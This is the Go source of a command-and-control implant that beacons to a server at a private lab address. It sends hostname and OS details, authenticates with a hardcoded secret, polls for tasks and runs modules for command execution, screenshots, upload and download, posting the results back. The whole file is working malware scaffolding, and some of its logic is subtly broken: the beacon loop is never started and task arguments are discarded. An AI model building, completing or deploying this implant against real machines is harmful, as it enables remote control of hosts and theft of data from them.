package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"math/rand"
	"os"
	"os/exec"
	"runtime"
	"time"
	"net/http"

	"myimplant/modules"

	"github.com/google/uuid"
)

type Implant struct {
	C2ServerURL string
	Secret      string
	ImplantID   string
	JWTToken    string
	Modules     map[string]modules.Module
}

func NewImplant(c2ServerURL string) *Implant {
	ImplantID := get_id()
	return &Implant{
		C2ServerURL: c2ServerURL,
		Secret:      "e7bcc0ba5fb1dc9cc09460baaa2a6986",
		ImplantID:   ImplantID,
		Modules:     make(map[string]modules.Module),
	}
}

func (i *Implant) Start() {
	if err := i.sendOSInfo(); err != nil {
		fmt.Println("Error sending OS info:", err)
		return
	}

	if err := i.login(); err != nil {
		fmt.Println("Error logging in:", err)
		return
	}

}

func (i *Implant) sendOSInfo() error {
	osInfo := map[string]string{
		"implant_id": i.ImplantID,
		"os":         runtime.GOOS,
		"os_version": getOSVersion(),
		"arch":       runtime.GOARCH,
		"hostname":   getHostname(),
	}

	data, err := json.Marshal(osInfo)
	if err != nil {
		return fmt.Errorf("error marshaling OS info: %v", err)
	}

	_, err = i.sendHTTPRequest("POST", "/config", data, false)
	return err
}

func (i *Implant) login() error {
	loginData := map[string]string{
		"implantID": i.ImplantID,
		"secret":    i.Secret,
	}

	data, err := json.Marshal(loginData)
	if err != nil {
		return fmt.Errorf("error marshaling login data: %v", err)
	}

	resp, err := i.sendHTTPRequest("POST", "/login", data, false)
	if err != nil {
		return err
	}
	fmt.Println("resp:", resp)
	defer resp.Body.Close()

	var response struct {
		JWTToken string `json:"jwt_token"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&response); err != nil {
		return fmt.Errorf("error decoding login response: %v", err)
	}

	fmt.Println("response:", response)
	i.JWTToken = response.JWTToken
	return nil
}

func (i *Implant) Beaconing() {

	fmt.Println("Implant started with ID:", i.ImplantID)
	for {
		var Timer = time.Duration((rand.ExpFloat64() / 0.5) * float64(time.Second)) // random time between 0 and 5 seconds
		tasks, err := i.fetchTasks()
		if err != nil {
			fmt.Println("Error fetching tasks:", err)
			time.Sleep(Timer) // Sleep for a while before retrying
			continue
		}

		for _, task := range tasks {
			fmt.Println("Executing task:", task)
			response, err := i.executeTask(task)
			if err != nil {
				fmt.Println("Error executing task:", err)
				// Handle error sending response or retry logic if needed
			} else {
				fmt.Println("Task execution response:", response)
			}
		}

		// Sleep for a while before fetching the next set of tasks
		time.Sleep(Timer)
	}
}

func (i *Implant) fetchTasks() ([]string, error) {

	resp, err := i.sendHTTPRequest("GET", "/task", nil, true)

	if err != nil {
		return nil, fmt.Errorf("error fetching tasks: %v", err)
	}
	defer resp.Body.Close()

	var tasks []string
	err = json.NewDecoder(resp.Body).Decode(&tasks)
	if err != nil {
		return nil, fmt.Errorf("error decoding tasks: %v", err)
	}

	return tasks, nil
}

func (i *Implant) executeTask(task string) (string, error) {
	moduleName := task
	module, found := i.Modules[moduleName]
	if !found {
		return "", fmt.Errorf("module %s not found", moduleName)
	}

	// Execute module command
	result, err := module.Execute("", nil)
	if err != nil {
		return "", fmt.Errorf("error executing module %s: %v", moduleName, err)
	}

	// Send response to C2 server
	responseData := map[string]string{
		"ImplantID": i.ImplantID,
		"task":      task,
		"result":    result,
		"timestamp": time.Now().Format(time.RFC3339),
	}
	responseDataBytes, err := json.Marshal(responseData)
	if err != nil {
		return "", fmt.Errorf("error marshaling response data: %v", err)
	}

	_, err = i.sendHTTPResponse("/tasks/response", responseDataBytes)
	if err != nil {
		return "", fmt.Errorf("error sending task response: %v", err)
	}

	return result, nil
}

func (i *Implant) sendHTTPRequest(method, path string, data []byte, includeToken bool) (*http.Response, error) {
	url := i.C2ServerURL + path
	req, err := http.NewRequest(method, url, bytes.NewBuffer(data))
	if err != nil {
		return nil, fmt.Errorf("error creating HTTP request: %v", err)
	}
	req.Header.Set("Content-Type", "application/json")
	if includeToken && i.JWTToken != "" {
		req.Header.Set("Authorization", "Bearer "+i.JWTToken)
	}

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("error sending HTTP request: %v", err)
	}
	return resp, nil
}

func (i *Implant) sendHTTPResponse(path string, data []byte) (*http.Response, error) {
	return i.sendHTTPRequest("POST", path, data, true)
}

func get_id() string {
	const filePath = "C:\\Users\\Public\\Documents\\id.txt"
	id, err := os.ReadFile(filePath)
	if err == nil {
		return string(id)
	}

	implantID := uuid.New().String()
	if err := os.WriteFile(filePath, []byte(implantID), 0644); err != nil {
		fmt.Println("Error writing implant ID to file:", err)
	}
	return implantID
}

func getHostname() string {
	hostname, err := os.Hostname()
	if err != nil {
		fmt.Println("Error getting hostname:", err)
		return "unknown"
	}
	return hostname
}

func getOSVersion() string {
	var cmd *exec.Cmd

	switch runtime.GOOS {
	case "linux":
		cmd = exec.Command("cat", "/etc/os-release")
	case "windows":
		cmd = exec.Command("cmd", "ver")
	case "darwin":
		cmd = exec.Command("sw_vers")
	default:
		return "Unknown OS"
	}

	var out bytes.Buffer
	cmd.Stdout = &out
	err := cmd.Run()
	if err != nil {
		return fmt.Sprintf("Error getting OS version: %v", err)
	}

	return out.String()
}

func main() {
	c2ServerURL := "http://192.168.0.113:5000"

	implant := NewImplant(c2ServerURL)

	// Register modules
	implant.Modules["exec"] = modules.NewExecuteModule()
	implant.Modules["ping"] = modules.NewPingModule()
	implant.Modules["screenshot"] = modules.NewScreenshotModule()
	implant.Modules["upload"] = modules.NewUploadModule()
	implant.Modules["download"] = modules.NewDownloadModule()

	implant.Start()
}
